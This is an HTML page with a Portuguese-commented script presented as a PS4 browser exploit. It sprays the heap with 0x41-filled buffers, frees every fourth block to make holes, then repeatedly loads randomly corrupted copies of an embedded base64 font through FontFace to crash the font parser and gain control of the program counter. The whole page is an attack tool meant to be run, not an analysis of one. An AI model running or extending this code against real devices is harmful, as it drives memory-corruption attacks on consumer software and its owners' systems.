<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 Heap Feng Shui (Font Exploit)</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
        #status { border: 1px solid #0f0; padding: 10px; margin-bottom: 20px; }
        button { 
            background: #000; color: #fff; border: 2px solid #fff; 
            padding: 15px; width: 100%; font-size: 18px; cursor: pointer; margin-bottom: 5px;
        }
        button:hover { background: #333; }
        #log { height: 300px; overflow-y: scroll; border: 1px solid #333; padding: 5px; color: #aaa; }
        /* O elemento alvo que vai sofrer o render */
        #target { font-size: 100px; margin-top: 50px; opacity: 0.1; }
    </style>
</head>
<body>

    <h1>HEAP FENG SHUI: FONT PARSER</h1>
    <p>Strategy: Spray Heap -> Poke Holes -> Inject Malformed Font</p>
    
    <div id="status">Status: Aguardando injeção...</div>
    <button onclick="runExploit()">INICIAR SEQUÊNCIA DE CRASH</button>
    <div id="target">TESTE DE MEMÓRIA</div>
    <div id="log"></div>

    <script>
        function log(msg) { 
            const d = new Date();
            const time = d.toLocaleTimeString() + "." + d.getMilliseconds();
            document.getElementById('log').innerText = `[${time}] ${msg}\n` + document.getElementById('log').innerText;
        }

        function updateStatus(msg) { document.getElementById('status').innerText = msg; }

        // --- FASE 1: Preparação de Memória (Spray) ---
        var sprayStore = [];
        
        function prepareHeap() {
            updateStatus("Fase 1: Preparando o Heap (Spraying)...");
            log("Alocando 256MB de padrões repetitivos...");
            
            try {
                // Aloca blocos de 1MB
                const blockSize = 1024 * 1024;
                // Padrão hexadecimal reconhecível (0x41 = 'A')
                // Se o crash log mostrar 0x41414141, sabemos que controlamos o PC (Program Counter)
                const payload = new Uint8Array(blockSize).fill(0x41); 
                
                for(let i=0; i < 256; i++) {
                    sprayStore.push(new Uint8Array(payload)); // Cópia
                }
                
                log("Heap preparado. Criando fragmentação (Swiss Cheese)...");
                
                // Libera 1 a cada 4 blocos para criar "buracos" onde a fonte vai cair
                for(let i=0; i < sprayStore.length; i+=4) {
                    sprayStore[i] = null;
                }
                
                log("Buracos criados. O Heap está pronto para a injeção.");
                return true;
            } catch(e) {
                log("Erro no Spray: " + e.message);
                return false;
            }
        }

        // --- FASE 2: Fuzzing de Fonte ---
        const base64Font = "d09GRgABAAAAAAQwAA4AAAAAA9gAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAABPUy8yAAABRAAAAEQAAABWNsEyg2NtYXAAAAGMAAAAOAAAAFgCqwGjY3Z0IAAAAcQAAAAIAAAACAAAAABmcGdtAAABzAAAAAMAAAADADIH02dseWYAAAHQAAAAJAAAACQ0j4A0aGVhZAAAAdwAAAAuAAAANgl2oIdoaGVhAAAB/AAAABUAAAAkCAEEAmhtdHgAAAIMAAAABwAAAAcACAAAbG9jYQAAAhQAAAAEAAAABAAGAABtYXhwAAACGAAAACAAAAAgAAwAHW5hbWUAAAI4AAAAOQAAAE55qGsucG9zdAAAAowAAAATAAAAIP+fADR4nGNgZGBg4GLQY7BhYYrIzPMJ4jM0MvCxMDGwM3GwMzEwMDExgMAJAQ4GhgQYwAAAFgACeJxjYGRgYOAAohmgkImBgYFhBZA+A8QCUOQOAAiYAFQAAAB4nGNgZGBg4ANiCQYQYGJgBMIGIGYB8xgABPwAPgAAAHicY2BkYGDgAWIxIGYC8xgXBvIYgGgAFA4AbgAAAHicY2BmAAI=";

        function corruptBytes(bytes) {
            const arr = new Uint8Array(bytes);
            // Corrupção cirúrgica: Modifica offsets que parecem cabeçalhos de tabela
            const mutations = 5;
            for(let i=0; i<mutations; i++) {
                // Tenta acertar o meio do arquivo onde ficam os glifos
                const pos = Math.floor(Math.random() * (arr.length - 50)) + 40;
                arr[pos] = Math.floor(Math.random() * 255);
                
                // Tenta inserir valores extremos (Integer Overflow)
                if(i % 2 === 0) {
                    arr[pos] = 0xFF; 
                    arr[pos+1] = 0xFF;
                }
            }
            return arr;
        }

        function base64ToUint8(base64) {
            const bin = atob(base64);
            const len = bin.length;
            const bytes = new Uint8Array(len);
            for (let i = 0; i < len; i++) bytes[i] = bin.charCodeAt(i);
            return bytes;
        }

        async function injectPoison() {
            updateStatus("Fase 2: Injetando Fontes Maliciosas...");
            const originalData = base64ToUint8(base64Font);
            const target = document.getElementById('target');
            
            let attempts = 0;
            
            const interval = setInterval(async () => {
                attempts++;
                
                try {
                    // 1. Gera fonte venenosa
                    const poisonData = corruptBytes(originalData);
                    const fontName = "Poison" + attempts;
                    const fontFace = new FontFace(fontName, poisonData);
                    
                    // 2. Tenta carregar (Parser C++ entra em ação)
                    // Aqui esperamos que ele use um dos "buracos" do Heap Spray
                    await fontFace.load();
                    document.fonts.add(fontFace);
                    
                    // 3. Força Renderização e Layout
                    target.style.fontFamily = fontName;
                    target.innerText = "CRASH " + Math.random();
                    
                    // Limpeza rápida para não estourar OOM (Out of Memory)
                    document.fonts.delete(fontFace);
                    
                    if(attempts % 50 === 0) log(`Tentativas: ${attempts}`);
                    
                } catch(e) {
                    // Erros silenciosos são ignorados, queremos o PANIC
                }
                
                // Se passar de 2000, reinicia o spray para mudar o layout da memória
                if(attempts > 2000) {
                    clearInterval(interval);
                    log("Reiniciando Spray para nova tentativa...");
                    sprayStore = []; // Limpa
                    setTimeout(runExploit, 1000);
                }
            }, 30); // Agressivo (30ms)
        }

        function runExploit() {
            if(prepareHeap()) {
                setTimeout(injectPoison, 500);
            }
        }

    </script>
</body>
</html>
